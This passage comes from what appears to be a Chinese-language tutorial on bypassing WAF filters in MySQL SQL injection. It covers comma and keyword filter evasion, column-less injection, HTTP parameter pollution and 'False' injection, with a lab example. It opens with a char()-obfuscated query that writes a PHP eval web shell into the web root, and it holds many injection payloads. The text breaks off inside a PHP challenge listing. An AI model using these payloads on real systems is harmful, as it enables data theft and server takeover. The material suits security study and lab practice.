@sql=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(39),char(60),char(63),char(112),char(104),char(112),char(32),char(101),char(118),char(97),char(108),char(40),char(36),char(95),char(80),char(79),char(83),char(84),char(91),char(119),char(104),char(111),char(97),char(109),char(105),char(93),char(41),char(59),char(63),char(62),char(39),char(32),char(105),char(110),char(116),char(111),char(32),char(111),char(117),char(116),char(102),char(105),char(108),char(101),char(32),char(39),char(47),char(118),char(97),char(114),char(47),char(119),char(119),char(119),char(47),char(104),char(116),char(109),char(108),char(47),char(102),char(97),char(118),char(105),char(99),char(111),char(110),char(47),char(115),char(104),char(101),char(108),char(108),char(46),char(112),char(104),char(112),char(39),char(59));prepare s1 from @sql;execute s1;</span><br></pre></td></tr></table></figure><p>也可以不用concat函数，直接用char函数也具有连接功能：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,119,104,111,97,109,105,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare s1 from @sql;execute s1;</span><br></pre></td></tr></table></figure><h3 id="过滤逗号绕过"><a href="#过滤逗号绕过" class="headerlink" title="过滤逗号绕过"></a>过滤逗号绕过</h3><p>当逗号被过滤了之后，我们便不能向下面这样正常的时候substr()函数和limit语句了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr((select database()),1,1);</span><br><span class="line">select * from <span class="built_in">users</span> <span class="built_in">limit</span> 0,1;</span><br></pre></td></tr></table></figure><p><strong>使用from…for…绕过</strong><br>我们可以使用 from…for.. 语句替换 substr() 函数里的 ,1,1：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">select substr((select database()) from 1 <span class="keyword">for</span> 1);</span><br><span class="line"><span class="comment"># 此时 from 1 for 1 中的两个1分别代替 substr() 函数里的两个1</span></span><br><span class="line"></span><br><span class="line">select substr((select database()) from 1 <span class="keyword">for</span> 1);    <span class="comment"># s</span></span><br><span class="line">select substr((select database()) from 2 <span class="keyword">for</span> 1);    <span class="comment"># e</span></span><br><span class="line">select substr((select database()) from 3 <span class="keyword">for</span> 1);    <span class="comment"># c</span></span><br><span class="line">select substr((select database()) from 4 <span class="keyword">for</span> 1);    <span class="comment"># u</span></span><br><span class="line">select substr((select database()) from 5 <span class="keyword">for</span> 1);    <span class="comment"># r</span></span><br><span class="line">select substr((select database()) from 6 <span class="keyword">for</span> 1);    <span class="comment"># i</span></span><br><span class="line">select substr((select database()) from 7 <span class="keyword">for</span> 1);    <span class="comment"># t</span></span><br><span class="line">select substr((select database()) from 8 <span class="keyword">for</span> 1);    <span class="comment"># y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果过滤了空格, 则可以使用括号来代替空格:</span></span><br><span class="line">select substr((select database())from(1)<span class="keyword">for</span>(1));    <span class="comment"># s</span></span><br><span class="line">select substr((select database())from(2)<span class="keyword">for</span>(1));    <span class="comment"># e</span></span><br><span class="line">select substr((select database())from(3)<span class="keyword">for</span>(1));    <span class="comment"># c</span></span><br><span class="line">select substr((select database())from(4)<span class="keyword">for</span>(1));    <span class="comment"># u</span></span><br><span class="line">select substr((select database())from(5)<span class="keyword">for</span>(1));    <span class="comment"># r</span></span><br><span class="line">select substr((select database())from(6)<span class="keyword">for</span>(1));    <span class="comment"># i</span></span><br><span class="line">select substr((select database())from(7)<span class="keyword">for</span>(1));    <span class="comment"># t</span></span><br><span class="line">select substr((select database())from(8)<span class="keyword">for</span>(1));    <span class="comment"># y</span></span><br></pre></td></tr></table></figure><p>即，from用来指定从何处开始截取，for用来指定截取的长度，如果不加for的话则 from 1 就相当于从字符串的第一位一直截取到最后：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select substr((select database()) from 1);    <span class="comment"># security</span></span><br><span class="line">select substr((select database()) from 2);    <span class="comment"># ecurity</span></span><br><span class="line">select substr((select database()) from 3);    <span class="comment"># curity</span></span><br><span class="line">select substr((select database()) from 4);    <span class="comment"># urity</span></span><br><span class="line">select substr((select database()) from 5);    <span class="comment"># rity</span></span><br><span class="line">select substr((select database()) from 6);    <span class="comment"># ity</span></span><br><span class="line">select substr((select database()) from 7);    <span class="comment"># ty</span></span><br><span class="line">select substr((select database()) from 8);    <span class="comment"># y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以使用负数来倒着截取:</span></span><br><span class="line">select substr((select database())from(-1));    <span class="comment"># y</span></span><br><span class="line">select substr((select database())from(-2));    <span class="comment"># ty</span></span><br><span class="line">select substr((select database())from(-3));    <span class="comment"># ity</span></span><br><span class="line">select substr((select database())from(-4));    <span class="comment"># rity</span></span><br><span class="line">select substr((select database())from(-5));    <span class="comment"># urity</span></span><br><span class="line">select substr((select database())from(-6));    <span class="comment"># curity</span></span><br><span class="line">select substr((select database())from(-7));    <span class="comment"># ecurity</span></span><br><span class="line">select substr((select database())from(-8));    <span class="comment"># security</span></span><br></pre></td></tr></table></figure><p><strong>使用offset关键字绕过</strong><br>我们可以使用 offset 语句替换 limit 语句里的逗号：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from <span class="built_in">users</span> <span class="built_in">limit</span> 1 offset 2;</span><br><span class="line"><span class="comment"># 此时 limit 1 offset 2 可以代替 limit 1,2</span></span><br></pre></td></tr></table></figure><p><strong>利用join与别名绕过</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host,user from user <span class="built_in">where</span> user=<span class="string">&#x27;a&#x27;</span>union(select*from((select`table_name`from`information_schema`.`tables`<span class="built_in">where</span>`table_schema`=<span class="string">&#x27;mysql&#x27;</span>)`a`<span class="built_in">join</span>(select`table_type`from`information_schema`.`tables`<span class="built_in">where</span>`table_schema`=<span class="string">&#x27;mysql&#x27;</span>)b));</span><br></pre></td></tr></table></figure><p><strong>过滤information_schema绕过与无列名注入</strong></p><p>当过滤or时，这个库就会被过滤，那么mysql在被waf禁掉了information_schema库后还能有哪些利用思路呢？</p><p>information_schema 简单来说，这个库在mysql中就是个信息数据库，它保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。在注入中，infromation_schema库的作用无非就是可以获取到table_schema、table_name、column_name这些数据库内的信息。</p><p>能够代替information_schema的有：<br>sys.schema_auto_increment_columns 只显示有自增的表<br>sys.schema_table_statistics_with_buffer<br>x$schema_table_statistics_with_buffer</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user <span class="built_in">where</span> <span class="built_in">id</span> = -1 union all select 1,2,3,group_concat(table_name)from sys.schema_table_statistics_with_buffer <span class="built_in">where</span> table_schema=database();</span><br></pre></td></tr></table></figure><p>mysql.innodb_table_stats<br>mysql.innodb_table_index</p><p>以上大部分特殊数据库都是在 mysql5.7 以后的版本才有，并且要访问sys数据库需要有相应的权限。</p><p>但是在使用上面的后两个表来获取表名之后select group_concat(table_name) from mysql.innodb_table_stats，我们是没有办法获得列的，这个时候就要采用无列名注入的办法。</p><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p>123法<br>我们可以利用一些查询上的技巧来进行无列名、表名的注入。</p><p>在我们直接select 1,2,3时，会创建一个虚拟的表<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241559936.png"></p><p>如图所见列名会被定义为1，2，3</p><p>当我们结合了union联合查询之后</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241559064.png"></p><p>如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password，进而我们就可以构造这样的查询语句来查询password：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `3` from (select 1,2,3 union select * from <span class="built_in">users</span>)a;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241600996.png"><br>末尾的 a 可以是任意字符，用于命名</p><p>当然，多数情况下，反引号会被过滤。当反引号不能使用的时候，可以使用别名来代替：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b union select * from admin)a;</span><br></pre></td></tr></table></figure><p>join<br>我们可以利用爆错，借助join和using爆出列名，id为第一列，username为第二列，可以逐个爆出，爆出全部列名之后即可得到列内数据。<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241600089.png"></p><h3 id="过滤其他关键字绕过"><a href="#过滤其他关键字绕过" class="headerlink" title="过滤其他关键字绕过"></a>过滤其他关键字绕过</h3><p>过滤 if 语句绕过<br>如果过滤了 if 关键字的话，我们可以使用case when语句绕过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(condition,1,0) &lt;=&gt; <span class="keyword">case</span> when condition <span class="keyword">then</span> 1 <span class="keyword">else</span> 0 end</span><br></pre></td></tr></table></figure><p>下面的if语句和case when语句是等效的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0<span class="string">&#x27; or if((ascii(substr((select database()),1,1))&gt;97),1,0)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0&#x27;</span> or <span class="keyword">case</span> when ascii(substr((select database()),1,1))&gt;97 <span class="keyword">then</span> 1 <span class="keyword">else</span> 0 end<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="过滤-substr-绕过"><a href="#过滤-substr-绕过" class="headerlink" title="过滤 substr 绕过"></a>过滤 substr 绕过</h3><ul><li><p>使用 lpad&#x2F;lpad<br>使用lpad()和rpad()绕过substr()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">select lpad((select database()),1,1)    // s</span><br><span class="line">select lpad((select database()),2,1)    // se</span><br><span class="line">select lpad((select database()),3,1)    // sec</span><br><span class="line">select lpad((select database()),4,1)    // secu</span><br><span class="line">select lpad((select database()),5,1)    // secur</span><br><span class="line">select lpad((select database()),6,1)    // securi</span><br><span class="line">select lpad((select database()),7,1)    // securit</span><br><span class="line">select lpad((select database()),8,1)    // security</span><br><span class="line"></span><br><span class="line">select rpad((select database()),1,1)    // s</span><br><span class="line">select rpad((select database()),2,1)    // se</span><br><span class="line">select rpad((select database()),3,1)    // sec</span><br><span class="line">select rpad((select database()),4,1)    // secu</span><br><span class="line">select rpad((select database()),5,1)    // secur</span><br><span class="line">select rpad((select database()),6,1)    // securi</span><br><span class="line">select rpad((select database()),7,1)    // securit</span><br><span class="line">select rpad((select database()),8,1)    // security</span><br></pre></td></tr></table></figure><p>lpad：函数语法：lpad(str1,length,str2)。其中str1是第一个字符串，length是结果字符串的长度，str2是一个填充字符串。如果str1的长度没有length那么长，则使用str2填充；如果str1的长度大于length，则截断。<br>rpad：同理</p></li><li><p>使用left()绕过substr()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select left((select database()),1)    // s</span><br><span class="line">select left((select database()),2)    // se</span><br><span class="line">select left((select database()),3)    // sec</span><br><span class="line">select left((select database()),4)    // secu</span><br><span class="line">select left((select database()),5)    // secur</span><br><span class="line">select left((select database()),6)    // securi</span><br><span class="line">select left((select database()),7)    // securit</span><br><span class="line">select left((select database()),8)    // security</span><br></pre></td></tr></table></figure></li><li><p>使用mid()绕过substr()</p></li></ul><p>mid()函数的使用就和substr()函数一样了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select mid((select database()),1,1)    // s</span><br><span class="line">select mid((select database()),2,1)    // e</span><br><span class="line">select mid((select database()),3,1)    // c</span><br><span class="line">select mid((select database()),4,1)    // u</span><br><span class="line">select mid((select database()),5,1)    // r</span><br><span class="line">......</span><br></pre></td></tr></table></figure><ul><li>还可以使用下面这个神奇的东西绕过<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select insert(insert((select database()),1,0,space(0)),2,222,space(0));    // s</span><br><span class="line">select insert(insert((select database()),1,1,space(0)),2,222,space(0));    // e</span><br><span class="line">select insert(insert((select database()),1,2,space(0)),2,222,space(0));    // c</span><br><span class="line">select insert(insert((select database()),1,3,space(0)),2,222,space(0));    // u</span><br><span class="line">select insert(insert((select database()),1,4,space(0)),2,222,space(0));    // r</span><br><span class="line">select insert(insert((select database()),1,5,space(0)),2,222,space(0));    // i</span><br><span class="line">select insert(insert((select database()),1,6,space(0)),2,222,space(0));    // t</span><br><span class="line">......</span><br></pre></td></tr></table></figure>INSERT( string , position , number , string2 )</li></ul><p>INSERT()函数在指定位置的字符串中插入一个字符串，并插入一定数量的字符。</p><h3 id="HTTP参数污染-HPP-漏洞绕过-Waf"><a href="#HTTP参数污染-HPP-漏洞绕过-Waf" class="headerlink" title="HTTP参数污染(HPP)漏洞绕过 Waf"></a>HTTP参数污染(HPP)漏洞绕过 Waf</h3><p>HPP是HTTP Parameter Pollution的缩写，意为HTTP参数污染。浏览器在跟服务器进行交互的过程中，浏览器往往会在GET或POST请求里面带上参数，这些参数会以 键-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。</p><p>但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a href="http://www.baidu.com/?name=aa&amp;name=bb%EF%BC%8C%E9%92%88%E5%AF%B9%E5%90%8C%E6%A0%B7%E5%90%8D%E7%A7%B0%E7%9A%84%E5%8F%82%E6%95%B0%E5%87%BA%E7%8E%B0%E5%A4%9A%E6%AC%A1%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%8C%E4%B8%8D%E5%90%8C%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F%E4%BC%9A%E4%B8%8D%E4%B8%80%E6%A0%B7%E3%80%82%E6%9C%89%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF%E5%8F%96%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF">http://www.baidu.com?name=aa&amp;name=bb，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是</a> name&#x3D;aa。有的服务器是取第二个参数，也就是 name&#x3D;bb。有的服务器两个参数都取，也就是 name&#x3D;aa,bb。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</p><p>HPP漏洞，与Web服务器环境、服务端使用的脚本有关。如下是不同类型的Web服务器对于出现多个参数时的选择：</p><table><thead><tr><th>表头Web 服务器</th><th>参数获取函数</th><th>获取到的参数</th></tr></thead><tbody><tr><td>PHP&#x2F;Apache</td><td>$_GET[‘a’]</td><td>Last</td></tr><tr><td>JSP&#x2F;Tomcat</td><td>Request.getParameter(‘a’)</td><td>First</td></tr><tr><td>Perl(CGI)&#x2F;Apache</td><td>Param(‘a’)</td><td>First</td></tr><tr><td>Python&#x2F;Apache</td><td>getvalue(‘a’)</td><td>All</td></tr><tr><td>ASP&#x2F;IIS</td><td>Request.QueryString(‘a’)</td><td>All</td></tr></tbody></table><p>假设服务器端有两个部分：第一部分是Tomcat为引擎的JSP&#x2F;Tomcat型服务器，第二部分是Apache为引擎的PHP&#x2F;Apache型服务器。第一部分的JSP&#x2F;Tomcat服务器处做数据过滤和处理，功能类似为一个WAF，而真正提供Web服务的是PHP&#x2F;Apache服务器。那么服务端的工作流程为：客户端访问服务器，能直接访问到JSP&#x2F;Tomcat服务器，然后JSP&#x2F;Tomcat服务器再向PHP&#x2F;Apache服务器请求数据。数据返回路径则相反。</p><p>那么此时我们便可以利用不同服务器解析参数的位置不同绕过WAF的检测。来看看如下请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.jsp?<span class="built_in">id</span>=1&amp;<span class="built_in">id</span>=2</span><br></pre></td></tr></table></figure><p>客户端请求首先过JSP&#x2F;Tomcat服务器，JSP&#x2F;Tomcat服务器解析第一个参数，接下来JSP&#x2F;Tomcat服务器去请求PHP&#x2F;Apache服务器，PHP&#x2F;Apache服务器解析最后一个参数。假设JSP&#x2F;Tomcat服务器作为Waf对第一个参数进行检测，那我们便可以在第二个参数中传payload来绕过Waf。如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.jsp?<span class="built_in">id</span>=1&amp;<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,database(),3--+</span></span><br></pre></td></tr></table></figure><p>这样 Waf 可能只检测第一个参数 id&#x3D;1，而PHP脚本真正识别的是 id&#x3D;select database()–+<br>[例题]Sql-Labs Less-29</p><h3 id="False-注入绕过"><a href="#False-注入绕过" class="headerlink" title="False 注入绕过"></a>False 注入绕过</h3><p><strong>False 注入原理</strong><br>前面我们学过的注入都是基于1&#x3D;1这样比较的普通注入，下面来说一说 False 注入，利用 False 我们可以绕过一些特定的 WAF 以及一些未来不确定的因素。</p><p>首先我们来看一看下面这个sql查询语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user <span class="built_in">where</span> uesrname = 0;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241610227.png"></p><p>为什么 username &#x3D; 0 会导致返回数据，而且是全部数据呢？</p><p>这就是一个基于 False 注入的例子，下面再举一个例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user <span class="built_in">where</span> username = 0;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241611666.png"></p><p>和上面是同一个表，但是为什么这里只返回了两组数据呢？说到这里不得不说一说有关于 MYSQL 的隐式类型转换。</p><p>MYSQL 的隐式类型转换，即当字符串和数字比较时，会把字符串转为浮点数，而字符串转换为浮点数很明显会转换失败，这时就会产生一个warning，转换的结果为0，然后0 &#x3D; 0 返回的是 True ，这样就将表中的数据全部返回了。但如果字符串开头是数字话还是会从数字部分截断，转换为数字进行比较，在第二个例子中，passwd 字段中有一个值是以数字1开头的并非为0，再进行 passwd &#x3D; 0 比较时，会从1开始截断，1 &#x3D; 0 不成立，当然就只返回两条数据了。这就是 MYSQL False 注入的原理。</p><p><strong>False 注入利用</strong><br>下面我们讲讲 False 注入如何利用，及如何构造 False 注入的利用点。在实际中我们接触到的语句都是带有引号的，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user <span class="built_in">where</span> username =<span class="string">&#x27;.$username.&#x27;</span>;</span><br></pre></td></tr></table></figure><p>在这种情况下，我们如何绕过引号构造出 0 这个值呢，我们需要做一些处理来构造false注入的利用点？</p><p>可以使用的姿势有很多，比如下面的算数运算：</p><ul><li>利用算数运算<br>加：+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">插入<span class="string">&#x27;+&#x27;</span>, 拼接的语句: select * from user <span class="built_in">where</span> username =<span class="string">&#x27;&#x27;</span>+<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>减：-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入<span class="string">&#x27;-&#x27;</span>, 拼接的语句: select * from user <span class="built_in">where</span> username =<span class="string">&#x27;&#x27;</span>-<span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul><p>乘：*</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入<span class="string">&#x27;*&#x27;</span>, 拼接的语句: select * from user <span class="built_in">where</span> username =<span class="string">&#x27;&#x27;</span>*<span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>除：&#x2F;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入<span class="string">&#x27;/6#, 拼接的语句: select * from user where username =&#x27;</span><span class="string">&#x27;/6#&#x27;</span>;</span><br></pre></td></tr></table></figure><p>取余：%</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入<span class="string">&#x27;%1#, 拼接的语句: select * from user where username =&#x27;</span><span class="string">&#x27;%1#&#x27;</span>;</span><br></pre></td></tr></table></figure><ul><li>利用位操作运算<br>我们还可以使用当字符串和数字运算的时候类型转换的问题进行利用。<br>和运算：&amp;<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入<span class="string">&#x27;&amp;0#, 拼接的语句: select * from user where username =&#x27;</span><span class="string">&#x27;&amp;0#&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul><p>或运算：|</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入<span class="string">&#x27;|0#, 拼接的语句: select * from user where username =&#x27;</span><span class="string">&#x27;|0#&#x27;</span>;</span><br></pre></td></tr></table></figure><p>异或运算：^</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入<span class="string">&#x27;^0#, 拼接的语句: select * from user where username =&#x27;</span><span class="string">&#x27;^0#&#x27;</span>;</span><br></pre></td></tr></table></figure><p>移位操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">插入<span class="string">&#x27;&lt;&lt;0# 或 &#x27;</span>&gt;&gt;0<span class="comment">#, 拼接的语句: </span></span><br><span class="line">select * from user <span class="built_in">where</span> username =<span class="string">&#x27;&#x27;</span>&lt;&lt;<span class="string">0#&#x27;;</span></span><br><span class="line"><span class="string">select * from user where username =&#x27;&#x27;&gt;&gt;0</span><span class="comment">#&#x27;;  </span></span><br></pre></td></tr></table></figure><ul><li>利用比较运算符<br>安全等于：&lt;&#x3D;&gt;<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;=0&lt;=&gt;1# 拼接的语句：where username=&#x27;</span><span class="string">&#x27;=0&lt;=&gt;1#&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><p>不等于&lt;&gt;(!&#x3D;)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;=0&lt;&gt;0# 拼接的语句：where username=&#x27;</span><span class="string">&#x27;=0&lt;&gt;0#&#x27;</span></span><br></pre></td></tr></table></figure><p>大小于&gt;或&lt;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&gt;-1# 拼接的语句：where username=&#x27;</span><span class="string">&#x27;&gt;-1#</span></span><br></pre></td></tr></table></figure><ul><li><p>其他</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+1 is not null<span class="comment">#  &#x27;in(-1,1)#  &#x27;not in(1,0)#  &#x27;like 1#  &#x27;REGEXP 1#  &#x27;BETWEEN 1 AND 1#  &#x27;div 1#  &#x27;xor 1#  &#x27;=round(0,1)=&#x27;1  &#x27;&lt;&gt;ifnull(1,2)=&#x27;1</span></span><br></pre></td></tr></table></figure></li><li><p>综合利用<br>false注入这种注入方式有的优势就是，在某些特定时候可以绕过WAF或者是一些其他的绕过。</p></li></ul><p>这里举例一道题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);  </span><br><span class="line"><span class="variable">$conn</span> -&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set names utf8&quot;</span>);  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randStr</span>(<span class="params"><span class="variable">$lenth</span>=<span class="number">32</span></span>)</span>&#123;</span><br><span class="line">     <span class="variable">$strBase</span> = <span class="string">&quot;1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;</span>;</span><br><span class="line">     <span class="variable">$str</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">     <span class="keyword">while</span>(<span class="variable">$lenth</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">       <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$strBase</span>,<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$strBase</span>)-<span class="number">1</span>),<span class="number">1</span>);</span><br><span class="line">       <span class="variable">$lenth</span> --;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$install</span>)&#123;</span><br><span class="line">     <span class="variable">$sql</span> = <span class="string">&quot;create table `user` (          `id` int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT ,          `username` varchar(30) NOT NULL,          `passwd` varchar(32) NOT NULL,          `role` varchar(30) NOT NULL        )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci &quot;</span>;</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span 